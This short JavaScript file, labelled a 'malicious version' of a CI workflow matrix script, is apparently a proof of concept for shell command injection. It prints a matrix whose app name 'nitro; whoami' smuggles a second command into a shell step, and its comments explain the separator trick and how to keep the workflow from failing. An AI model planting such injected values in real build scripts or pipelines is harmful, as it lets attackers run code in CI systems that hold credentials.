// Malicious version of the script

const matrix = {
  app: [
    {
      // This is the payload.
      // The shell will see 'nitro' as the first command, then ';'
      // as a command separator, and 'whoami' as the second command.
      name: 'nitro; whoami',
      project: 'workbench-nitro-workflow',
      canary: false // Added to match the structure
    },
    // We can add the other apps so the workflow doesn't just fail
    {
      name: 'nextjs-webpack',
      project: 'example-nextjs-workflow-webpack',
      canary: false
    }
  ],
};

// Note: We've removed all the original logic and are just
// outputting this malicious JSON.
console.log(JSON.stringify(matrix));
